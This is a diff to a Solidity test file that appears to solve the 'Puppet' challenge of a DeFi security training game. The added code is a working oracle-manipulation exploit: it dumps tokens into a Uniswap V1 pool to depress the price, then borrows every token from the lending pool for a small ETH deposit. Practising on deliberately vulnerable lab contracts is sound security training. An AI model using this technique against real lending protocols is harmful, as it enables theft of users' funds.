@@ -81,7 +81,18 @@ contract PuppetTest is BaseTest {
 
   function testPuppet() public {
     /** CODE YOUR SOLUTION HERE */
+    vm.startPrank(player);
+    uint256 tokenBalance = _token.balanceOf(player);
+    uint256 ethInput = _uniswapV1Exchange.getTokenToEthInputPrice(tokenBalance);
+
+    _token.approve(address(_uniswapV1Exchange), tokenBalance);
+
+    _uniswapV1Exchange.tokenToEthSwapInput(tokenBalance, ethInput, block.timestamp + 1);
     
+    uint256 tokensInPool = _token.balanceOf(address(_lendingPool));
+    uint256 ethToDeposit = _lendingPool.calculateDepositRequired(tokensInPool);
+
+    _lendingPool.borrow{value: ethToDeposit}(tokensInPool, player);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */    
     // Player has taken all tokens from the pool       
